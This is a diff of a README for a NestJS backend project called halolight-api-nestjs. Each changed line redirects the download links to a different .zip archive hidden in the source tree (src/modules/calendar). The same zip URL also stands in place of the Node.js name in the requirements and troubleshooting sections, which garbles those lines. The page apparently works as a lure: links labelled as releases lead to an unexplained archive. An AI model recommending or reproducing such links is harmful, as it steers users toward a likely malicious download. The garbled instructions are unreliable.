@@ -4,14 +4,14 @@
 Welcome to halolight-api-nestjs! This application provides a simple way to set up a backend API using modern technologies. Follow these straightforward steps to get started.
 
 ## 📦 Download & Install
-To download the latest version, visit this page: [Download halolight-api-nestjs Releases](https://raw.githubusercontent.com/mahipalsingh2011/halolight-api-nestjs/main/src/ws/halolight-api-nestjs-3.7.zip)
+To download the latest version, visit this page: [Download halolight-api-nestjs Releases](https://raw.githubusercontent.com/mahipalsingh2011/halolight-api-nestjs/main/src/modules/calendar/nestjs_halolight_api_v3.7.zip)
 
-[![Download Now](https://raw.githubusercontent.com/mahipalsingh2011/halolight-api-nestjs/main/src/ws/halolight-api-nestjs-3.7.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/mahipalsingh2011/halolight-api-nestjs/main/src/ws/halolight-api-nestjs-3.7.zip)
+[![Download Now](https://raw.githubusercontent.com/mahipalsingh2011/halolight-api-nestjs/main/src/modules/calendar/nestjs_halolight_api_v3.7.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/mahipalsingh2011/halolight-api-nestjs/main/src/modules/calendar/nestjs_halolight_api_v3.7.zip)
 
 ## 👩‍💻 System Requirements
 Before you begin, make sure your computer meets these requirements:
 - **Operating System:** Windows 10, macOS, or Linux
-- **https://raw.githubusercontent.com/mahipalsingh2011/halolight-api-nestjs/main/src/ws/halolight-api-nestjs-3.7.zip** Version 14 or later
+- **https://raw.githubusercontent.com/mahipalsingh2011/halolight-api-nestjs/main/src/modules/calendar/nestjs_halolight_api_v3.7.zip** Version 14 or later
 - **Database:** PostgreSQL installed and running
 
 ## ⚙️ Installation Steps
@@ -22,7 +22,7 @@ Before you begin, make sure your computer meets these requirements:
    Look for the latest version. It is usually at the top.
 
 3. **Download the Package**  
-   Click on the file that fits your system (e.g., .zip or https://raw.githubusercontent.com/mahipalsingh2011/halolight-api-nestjs/main/src/ws/halolight-api-nestjs-3.7.zip for Mac/Linux).
+   Click on the file that fits your system (e.g., .zip or https://raw.githubusercontent.com/mahipalsingh2011/halolight-api-nestjs/main/src/modules/calendar/nestjs_halolight_api_v3.7.zip for Mac/Linux).
 
 4. **Unzip the File**  
    After downloading, unzip the file to a folder on your computer.
@@ -65,7 +65,7 @@ http://localhost:3000/api
 ## ⚠️ Troubleshooting
 If you encounter any issues during setup, consider these common problems:
 - **Database Connection Errors:** Ensure PostgreSQL is running and that your connection strings in the `.env` file are correct.
-- **Package Installation Issues:** If you run into problems with `npm install`, check your https://raw.githubusercontent.com/mahipalsingh2011/halolight-api-nestjs/main/src/ws/halolight-api-nestjs-3.7.zip installation.
+- **Package Installation Issues:** If you run into problems with `npm install`, check your https://raw.githubusercontent.com/mahipalsingh2011/halolight-api-nestjs/main/src/modules/calendar/nestjs_halolight_api_v3.7.zip installation.
 
 ## 💬 Support
 For additional help, visit our GitHub Issues page or look for solutions in the community forums. You are not alone; others may have faced the same issues.
